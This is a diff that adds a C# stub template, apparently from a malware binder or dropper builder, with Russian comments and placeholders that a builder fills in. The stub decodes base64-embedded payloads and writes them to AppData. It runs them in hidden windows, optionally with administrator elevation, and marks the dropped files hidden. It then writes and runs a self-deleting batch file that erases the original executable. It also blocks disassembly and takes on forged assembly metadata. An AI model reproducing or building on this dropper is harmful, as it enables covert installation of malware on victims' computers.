@@ -1,0 +1,243 @@
+#region Зависимости
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using %SpaceName%;
+#endregion
+
+#region Свойства файла
+[module: SuppressIldasm]
+[assembly: AssemblyTitle(AssBooster.TITLE)]
+[assembly: AssemblyDescription(AssBooster.DESCRIPTION)]
+[assembly: AssemblyCompany(AssBooster.COMPANY)]
+[assembly: AssemblyProduct(AssBooster.PRODUCT)]
+[assembly: AssemblyCopyright(AssBooster.COPYRIGHT)]
+[assembly: ComVisible(false)]
+[assembly: Guid(AssBooster.GUID)]
+[assembly: AssemblyVersion(AssBooster.FileVersionStructure.VERSION)]
+[assembly: AssemblyFileVersion(AssBooster.FileVersionStructure.FILEVERSION)]
+#endregion
+
+namespace %SpaceName%
+{
+    internal static class Program
+    {
+        [STAThread]
+        public static void Main()
+        {
+            // Проверка на остановку потока перед запуском всех функций
+            if (PanelWork.SleepTime)
+            {
+                PanelWork.Sleeping(2000);
+            }
+
+            // Список шифрованных файлов для загрузки
+            string[] files = new string[] { /* [BIN] */ };
+            // Перебираем список файлов из массива
+            foreach (string payload in files)
+            {
+                // Разбиваем строки на подстроки 
+                string b64 = payload.Split('™')[0], plName = payload.Split('™')[1];
+                DropFiles(b64, plName);
+            }
+            // Проверяем на запуск самоудаления билд файла
+            if (PanelWork.SuicideActivate)
+            {
+                // Проверяем *.bat файл
+                if (!File.Exists(GlobalPath.SuicideFile))
+                {
+                    // Создаём бинарник
+                    Suicide.Inizialize(GlobalPath.SuicideFile);
+                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Запускаем батник
+                }
+                else
+                {
+                    CommandRunner.RunFile(GlobalPath.SuicideFile); // Запускаем батник
+                }
+            }
+        }
+
+        /// <summary>
+        /// Метод для дропа файлов в определённую папку
+        /// </summary>
+        /// <param name="payload">Файл для расшифровки</param>
+        /// <param name="payloadName">Имя файла</param>
+        private static void DropFiles(string payload, string payloadName)
+        {
+            // Список расширений которые можно запускать
+            var extensionrunner = new string[]
+            {
+               ".exe", ".bat", ".txt", ".scr", ".doc", ".docx",
+               ".png", ".jpg", ".wav", ".mp3", ".json"
+            };
+            try
+            {
+                // Соединяем имя файла и путь куда будем сохранять всё
+                string FinalPath = Path.Combine(GlobalPath.AppData, payloadName);
+                // Расшифровываем строки файл(а)ов из base64
+                byte[] EncryptBinder = Convert.FromBase64String(payload);
+                if (!File.Exists(FinalPath))
+                {
+                    // Сохраняем файл(ы)
+                    File.WriteAllBytes(FinalPath, EncryptBinder);
+                    // Перебираем цикл расширений
+                    foreach (var bypassfiles in extensionrunner)
+                    {
+                        // Проверяем на схожие расширения файл(а)ов
+                        if (FinalPath.EndsWith(bypassfiles, StringComparison.InvariantCultureIgnoreCase))
+                        {
+                            // Запускаем файл
+                            CommandRunner.RunFile(FinalPath);
+                        }
+                    }
+                }
+                else
+                {
+                    // Запускаем файл
+                    CommandRunner.RunFile(FinalPath);
+                }
+            }
+            catch { }
+        }
+    }
+    public static class Suicide
+    {
+        /// <summary>
+        /// Метод для создания батника для самоудаления билд файла
+        /// </summary>
+        /// <param name="pathfile">Имя билд файла</param>
+        public static void Inizialize(string pathfile)
+        {
+            // Проверяем если строка не пустая и расширения файла является *.bat
+            if (!string.IsNullOrWhiteSpace(pathfile) && pathfile.EndsWith(".bat", StringComparison.InvariantCultureIgnoreCase))
+            {
+                try
+                {
+                    using (var sw = new StreamWriter(pathfile))
+                    {
+                        sw.WriteLine("@echo off"); // Не покаывать вывод сообщений
+                        sw.WriteLine("chcp 1251 >NUL"); // Задаём кодировку для чтения кириллицы
+                        sw.WriteLine("cls"); // отчищяем консоль
+                        sw.WriteLine(":loop"); // Создаём цикл
+                        sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\"")); // Удаляем билд файла
+                        sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop")); // Проверяем файл в цикле
+                        sw.WriteLine("chcp 866 >NUL"); // Для чтения кириллицы в консоли
+                        sw.WriteLine("echo НННННННННННННННННННННННННННННННН");
+                        sw.WriteLine("del %0"); // Самоудаляемся
+                        sw.Flush(); // Отчищаем буфер потока
+                    }
+                }
+                catch { }
+            }
+        }
+    }
+
+    public static class GlobalPath
+    {
+        public static readonly string GetFileName = Path.GetFileName(AppDomain.CurrentDomain.FriendlyName);
+        public static readonly string GetFullExeRunner = Assembly.GetExecutingAssembly().Location;
+        public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        public static readonly string SuicideFile = Path.Combine(AppData, "Remove.bat");
+    }
+
+    public static class AssBooster
+    {
+        public const string TITLE = "[TITLE]";
+        public const string DESCRIPTION = "[DESCRIPTION]";
+        public const string COMPANY = "[COMPANY]";
+        public const string PRODUCT = "[PRODUCT]";
+        public const string COPYRIGHT = "Copyright (c) [COPYRIGHT] 2020";
+        public const string GUID = "[GUID]";
+        internal struct FileVersionStructure
+        {
+            public const string VERSION = "[VERSION]";
+            public const string FILEVERSION = "[FILEVERSION]";
+        }
+    }
+
+    public static class PanelWork
+    {
+        /// <summary>
+        /// Метод для остановки потока в милисекундах
+        /// </summary>
+        /// <param name="time">Кол-во милисекунд</param>
+        public static void Sleeping(int time)
+        {
+            try
+            {
+                Thread.Sleep(time);
+            }
+            catch { }
+        }
+
+        /// <summary>
+        /// Метод для проверки размера файла
+        /// </summary>
+        /// <param name="filename">Имя файла</param>
+        /// <returns></returns>
+        public static bool CheckerFile(string filename)
+        {
+            try
+            {
+                var file = new FileInfo(filename);
+                return file.Length > 0;
+            }
+            catch { return false; }
+        }
+
+        public static bool SuicideActivate = [Delay]; // [Delay];
+        public static bool RunFromAdmin = [AdminRun]; // [AdminRun];
+        public static bool SleepTime = [Time]; // [Time];
+        public static bool HideFiles = [HideFiles]; // [HideFiles];
+    }
+
+    public static class CommandRunner
+    {
+        /// <summary>
+        /// Метод для запуска файл(а)ов с параметрами
+        /// </summary>
+        /// <param name="filename">Имя файла</param>
+        public static void RunFile(string filename)
+        {
+            // Если строка не пустая и файл не имеет нулевой размер
+            if (!string.IsNullOrWhiteSpace(filename) && PanelWork.CheckerFile(filename))
+            {
+                try
+                {
+                    // Скрываем консоль запуска
+                    var style = ProcessWindowStyle.Hidden;
+                    // Передаём параметры для запуска
+                    var startInfo = new ProcessStartInfo
+                    {
+                        FileName = filename,
+                        CreateNoWindow = false,
+                        WindowStyle = style,
+                    };
+                    // Проверяем запуск от Админа
+                    if (PanelWork.RunFromAdmin)
+                    {
+                        startInfo.UseShellExecute = true;
+                        startInfo.Verb = "runas";
+                    }
+                    // Проверяем скрывать ли файл 
+                    if (PanelWork.HideFiles)
+                    {
+                        try
+                        {
+                            if (!filename.Contains("Remove")) File.SetAttributes(filename, FileAttributes.Hidden);
+                        }
+                        catch { }
+                    }
+                    // Запускаем процесс с параметрами
+                    using (var info = Process.Start(startInfo)) { info.Refresh(); }
+                }
+                catch { }
+            }
+        }
+    }
+}
